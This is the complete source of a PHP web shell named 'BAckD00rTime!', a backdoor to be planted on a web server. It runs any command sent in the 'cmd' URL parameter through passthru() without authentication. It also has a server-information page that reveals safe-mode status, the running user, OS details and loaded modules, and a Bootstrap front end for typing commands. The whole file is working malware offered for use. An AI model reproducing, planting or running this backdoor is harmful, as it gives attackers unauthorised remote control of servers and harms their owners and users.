<!-- PHP CODE -->
<?php session_start(); ?>
<?php

//Start Timer
$a = explode(" ",microtime());
$StartTime = $a[0] + $a[1];

//Bot Version and Information 
$ver = "0.0.3 Alpha";
$phpv = @phpversion();
$prefix = " - ";
$suffix = NULL;
$safemodestatus =  SafeModeStatus();

$a = explode(" ",microtime());
$EndTime = substr($a[0] + $a[1] - $StartTime,0,6);

//SafeMode Status
function SafeModeStatus(){
	if(function_exists("ini_get") and is_callable("ini_get"))
		if(ini_get('safe_mode') == "1" or strtoupper(ini_get('safe_mode')) == "ON")
			return "<span style=\"color:red;font-weight:Bold;\">On</span>";
		else
			return "<span style=\"color:green;font-weight:Bold;\">Off</span>";
		else
			return "<span style=\"color:gray;font-weight:Bold;\">Unknown</span>";
	}

function OpenBaseDirStatus(){
	if(function_exists("ini_get") and is_callable("ini_get"))
		if(strlen(ini_get('open_basedir')) > 3)
			return "<span style=\"color:red;font-weight:Bold;\">On</span>";
		else
			return "<span style=\"color:green;font-weight:Bold;\">Off</span>";
		else
			return "<span style=\"color:gray;font-weight:Bold;\">Unknown</span>";
}

function Details(){
	$result = "<h2>Server Information</h2>";

	$result .= "<span class=\"ServerInfoTitle\"><b>Safe Mode:</b></span> ".SafeModeStatus()."<br />\n";
	$result .= "<span class=\"ServerInfoTitle\"><b>Open BaseDir:</b></span> ".OpenBaseDirStatus()."<br />\n";

	$os = @php_uname();
	$Functions = array(
		"PHP Version"   =>  "phpversion",
		"PHP Logo Guid"   =>  "php_logo_guid",
		"PHP Sapi Name"   =>  "php_sapi_name",
		"Zend Version"    =>  "zend_version",
		"Zend Logo Guid"    =>  "zend_logo_guid",
		"Apache Version"    =>  "apache_get_version",
		"Current User"    =>  "get_current_user",
		"Current Gid"   =>  "getmygid",
		"Current Uid"   =>  "getmyuid",
		"Current Pid"   =>  "getmypid",
		"Current Inode"   =>  "getmyinode",
		"Operation System Info" =>  "php_uname",
		);

	foreach($Functions as $desc=>$func)
		if(function_exists($func) and is_callable($func))
			$result .= "<span class=\"ServerInfoTitle\"><b>".$desc.":</b></span> ".@$func()."<br />\n";

	//Operation System Name
	if(defined("PHP_OS")){
		$result .= "<span class=\"ServerInfoTitle\"><b>Operation System:</b></span> ".PHP_OS."<br />\n";
		$os = PHP_OS;
	}

	//Server Software
	if(isset($_SERVER['SERVER_SOFTWARE']) and strlen($_SERVER['SERVER_SOFTWARE']) > 0)
		$result .= "<span class=\"ServerInfoTitle\"><b>Server Software:</b></span> ".$_SERVER['SERVER_SOFTWARE']."<br />\n";

	//Server IP
	$result .= "<span class=\"ServerInfoTitle\"><b>Server IP Address:</b></span> ".$_SERVER['SERVER_ADDR']."<br />\n";

	//Loaded Modules
	if(function_exists("apache_get_modules") and is_callable("apache_get_modules")){
		$result .= "<span class=\"ServerInfoTitle\"><b><u>Loaded Modules:</u></b></span>";
		$count_modules = 0;
		foreach(apache_get_modules() as $module){
			$result .= $module;

			if($count_modules == count(apache_get_modules())-1)
				$result.= ".";
			else
				$result.= ", ";

			$count_modules++;
		}

		$result .= "<br />\n";
		$result .= "<span class=\"ServerInfoTitle\">Total Loaded Modules:</span> ".$count_modules."<br />\n";
	}

	//Loaded Extensions
	if(function_exists("get_loaded_extensions") and is_callable("get_loaded_extensions")){
		$result .= "<span class=\"ServerInfoTitle\">Loaded Extensions:</span> ";
		$count_ext = 0;
		foreach(get_loaded_extensions() as $module){
			$result .= $module;

			if($count_ext == count(get_loaded_extensions())-1)
				$result.= ".";
			else
				$result.= ", ";

			$count_ext++;
		}

		$result .= "<br />\n";
		$result .= "<span class=\"ServerInfoTitle\">Total Loaded Extensions:</span> ".$count_ext."<br />\n";
	}

	//Main Path
	$path = (eregi("win",strtolower($os))) ? "C:" : "/" ;

	//Drivers
	if($path != "/"){
		$result .= "<span class=\"ServerInfoTitle\">Detected Drivers:</span> ";
		$count = 1;
		$Drivers = array();

		foreach(range("a","z") as $driver)
			if(is_dir($driver.":\\"))
				$Drivers[] = $driver;

			foreach($Drivers as $driver){
				$result .= $driver;

				if($count == count($Drivers))
					$result .= ".";
				else
					$result .= ", ";
				$count++;
			}
		}

		return $result;
	}


function showInfo($cmd) {
	$user = $_SESSION['user'];
	$host = $_SESSION['host'];
	$path = $_SESSION['path'];
	echo "$host:$path $$user : $cmd";
}

if (!empty($_GET['cmd'])) {
	echo "<br/>";
	$cmd =  $_GET['cmd'];
	if (ereg("cd (.*)", $cmd, $file)) {
		if ($file[1]!='.') {
			if ($file[1] == '/') {
				$path = $file[1];
			} else if ($file[1] == '..') {
				$i = strripos($_SESSION['path'], '/');
				$path = substr($_SESSION['path'], 0, $i);
				if ($i == 0 ) {
					$_SESSION['path'] = '/';
				}
			} else{
				if ($_SESSION['path'] == '/') {
					$path = $_SESSION['path'].$file[1];
				} else {
					$path = $_SESSION['path'].'/'.$file[1];
				}
			}
		}
		if((file_exists($file[1]) && is_dir($file[1])) || $file[1]='~') {
			$_SESSION['path'] = $path;
			showInfo('');
		} else {
			echo "<pre>$cmd: No such file or directory</pre>";
		}
	} else {
		$path = $_SESSION['path'];
		passthru($cmd, $returnval);
		if($returnval){
			echo 'error';
		}else{  
			echo 'done';
		} 
		echo "<br/><br/>";
	}
	exit;
}

function PHPShell(){
	if (empty($_SESSION['path'])) {
		$_SESSION['user'] = shell_exec('whoami');
		$_SESSION['host'] = shell_exec('hostname');
		$_SESSION['path'] = dirname(__FILE__);
	}
	
	$result  = '<div class="log-list"><div id="log-item"></div></div>';
	$result .= '<form action="javascript:;" method="post" onsubmit="postCmd(event)"/>';
	$result .= '<label id="info" for="cmd"><?php showInfo();?></label>';
	$result .= '<input class="form-control" id="cmd" type="text" tab="1" autofocus="autofocus"/>';
	$result .= '<a href="#" onclick="postCmd(event);" class="btn btn-block btn-lg btn-success">Success Button</a></form>';
	return $result;
}
?>
<!-- PHP CODE -->


<!-- FRONTEND CODE -->
<html>
<head>
	<title>BAckD00rTime!</title>

	<!-- Bootstrap -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
	<!-- Flat UI -->
	<link rel="stylesheet" href="https://designmodo.github.io/Flat-UI/dist/css/flat-ui.min.css">
	<!-- StyleSheet -->
	<style>
		.navi{
			border-radius: 0px;
		}
		.actions{
			margin-bottom: 100px;
		}
		.copyright{
			text-align: center;
		}
	</style>
	<script>
		postCmd = function(e) {
			e.preventDefault;
			var cmd = document.getElementById('cmd'),
			log = document.getElementById('log-item'),
			text = document.getElementById('text'),
			info = document.getElementById('info'),
			ajax = new XMLHttpRequest();
			if (!cmd.value) {return;};
			ajax.open("GET", "?cmd="+cmd.value);
			ajax.send();
			ajax.onreadystatechange = function() {
				if ( ajax.readyState == 4 ) {
					if (cmd.value.match("cd ")) {
						info.innerHTML = ajax.responseText;
						console.log(ajax.responseText);
						console.log(info);
					} else {
						var t = "<pre>%s</pre>";
						log.innerHTML += t.replace('%s', ajax.responseText);
					}
					text.scrollIntoView();
					cmd.value = "";
				}
			}
		};
	</script>
</head>
<body>
	<nav class="navbar navbar-inverse navbar-embossed navi" role="navigation">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse-01">
				<span class="sr-only">Toggle navigation</span>
			</button>
			<a class="navbar-brand" href="#">Backd00rTime!</a>
		</div>
		<div class="collapse navbar-collapse" id="navbar-collapse-01">
			<ul class="nav navbar-nav navbar-right">
				<li><a href="?">Home</a></li>
				<li><a href="?act=shell">PHP Shell</a></li>
				<li><a href="?act=info">Server Information</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>


	<!-- ACTIONS -->
	<div class="actions">
		<div class="container">
			<div class="row">
				<?php
          			//Navigation Actions
				if(isset($_GET["act"])) {
					switch($_GET['act']){
						case 'info': echo(Details()); break;
						case 'shell': echo(PHPShell()); break;
					}
				}
				?>
			</div>
		</div>
	</div>

	<!-- FOOTER -->
	<div class="copyright">
		<div class="container">
			<p>Programmed by Mr_NiceGuy & CaptnNemo &copy; 2016 <br>
				[ Execution Time: <?php echo $EndTime ?>] [ Shell Version: <?php echo $ver ?> ]</p>
			</div>
		</div>
		<script type="text/javascript" src="https://designmodo.github.io/Flat-UI/dist/js/vendor/jquery.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" ></script>
		<script type="text/javascript" src="https://designmodo.github.io/Flat-UI/dist/js/flat-ui.min.js"></script>
	</body>
	</html>
<!-- FRONTEND CODE -->
